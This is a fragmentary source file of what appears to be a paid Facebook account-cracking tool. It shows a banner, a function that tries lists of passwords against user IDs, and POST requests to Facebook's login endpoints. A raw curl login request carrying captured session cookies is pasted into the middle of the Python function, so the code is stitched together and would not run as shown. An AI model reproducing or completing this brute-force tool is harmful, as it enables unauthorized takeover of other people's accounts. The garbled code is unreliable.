...
\033[1;32m[ 󰟱 ]  \033[1;32mTOOL VIRSION :  \033[1;36m2.0.0
\033[1;32m[ 󰟱 ]  \033[1;32mTOOL TYPE    : \033[1;32m Paid 
\033[1;92m══════════════════════════════════════════════════════
""")
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
curl 'https://mbasic.facebook.com/login/?ref=dbl&fl&login_from_aymh=1' \
  -H 'authority: mbasic.facebook.com' \
  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'accept-language: en-GB,en-US;q=0.9,en;q=0.8' \
  -H 'cache-control: max-age=0' \
  -H 'cookie: sb=yRY2ZRqdOxVAaRY-GprhUgSX; datr=yRY2ZZB3aMSfchgWNfgm9zV1; vpd=v1%3B736x393x2.75; wl_cbv=v2%3Bclient_version%3A2338%3Btimestamp%3A1698059457; locale=es_LA; dpr=3.0234789848327637; wd=891x1669; fr=15wa8DPww9LzEjEAh.AWUfnzhUoz9vfQV1PavW0DgjXxw.BlNlhe.91.AAA.0.0.BlOyFT.AWW_YKi1pAA' \
  -H 'dpr: 2.75' \
  -H 'sec-ch-prefers-color-scheme: light' \
  -H 'sec-ch-ua: "Not)A;Brand";v="24", "Chromium";v="116"' \
  -H 'sec-ch-ua-full-version-list: "Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"' \
  ...
  --compressed
             session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
